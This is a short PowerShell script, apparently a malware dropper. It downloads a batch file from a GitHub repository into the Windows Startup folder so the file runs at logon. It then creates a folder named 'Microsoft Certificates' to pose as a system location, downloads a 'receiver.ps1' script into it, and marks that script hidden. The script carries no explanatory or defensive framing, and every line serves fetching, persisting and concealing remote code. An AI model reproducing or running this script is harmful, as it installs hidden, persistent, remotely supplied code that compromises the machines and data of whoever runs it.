Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/starter.bat' -OutFile ([System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup\starter.bat'))

$folderPath = "C:\ProgramData\Microsoft Certificates"

if (-not (Test-Path -Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory
    Write-Host "Folder 'Microsoft Certificates' created at $folderPath"
} else {
    Write-Host "Folder 'Microsoft Certificates' already exists at $folderPath"
}

Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/pico/raw/main/receiver.ps1' -OutFile ([System.IO.Path]::Combine($env:APPDATA, 'C:\ProgramData\Microsoft Certificates\receiver.ps1'))

Set-ItemProperty -Path "C:\ProgramData\Microsoft Certificates\receiver.ps1" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
